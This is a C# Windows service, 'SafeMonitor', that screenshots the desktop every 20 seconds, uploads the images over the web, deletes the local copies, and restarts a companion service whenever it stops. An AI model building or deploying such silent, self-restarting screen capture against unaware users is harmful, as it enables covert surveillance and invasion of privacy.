using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows;

namespace SafeMonitor
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }
        #region SEVICE_EVENT

        internal void StartMonitor(string[] args)
        {
            this.OnStart(args);
            while (true)
            {
                Thread.Sleep(Common.MainThreadInterval);
            }
        }

        protected override void OnStart(string[] args)
        {
            timer.Elapsed += new ElapsedEventHandler(OnCaptureProcess);
            timer.Interval = Common.CaptureInterval; // 20s
            timer.Enabled = true;

            timerProc.Elapsed += new ElapsedEventHandler(OnProcessMonitor);
            timerProc.Interval = Common.ProcessMonitorInterval; // 20s
            timerProc.Enabled = true;

            // First Capture
            procCaptureProcess();
        }
        
        protected override void OnStop()
        {         
        }
        #endregion

        #region PROCESSMONITOR
        private void OnProcessMonitor(object src, ElapsedEventArgs arg)
        {
            try
            {
                ServiceController sc = new ServiceController(monitorProcess);

                if (sc.Status == ServiceControllerStatus.Stopped)
                {

                    sc.Start();
                    sc.WaitForStatus(ServiceControllerStatus.Running);

                }
            }
            catch (Exception e) { }
        }
        #endregion

        #region CAPTURE_PROCESS
        private void procCaptureProcess()
        {         
            //Capture Process  return: folderpath
            screenCapture.ScreenShot();
            //Send process to web
            List<string> successfiles = new List<string>();
            string[] files = System.IO.Directory.GetFiles(screenCapture.CaptureDirectory);
            foreach (var file in files)
            {
                //Send to web
                SendFileviaWeb sendfile = new SendFileviaWeb(file);
                if (sendfile.SendFile())
                {
                    //if success, add filename
                    successfiles.Add(file);
                }
            }

            //If success delete file.
            foreach (var file in successfiles)
            {
                if (File.Exists(file)) File.Delete(file);
            }
        }

        private void OnCaptureProcess(object src, ElapsedEventArgs arg)
        {
            procCaptureProcess();
        }
        #endregion 
        
        private string monitorProcess = "StartService";
        private System.Timers.Timer timer = new System.Timers.Timer();
        private System.Timers.Timer timerProc = new System.Timers.Timer();
        private ScreenCapture screenCapture =  new ScreenCapture();
    }
}
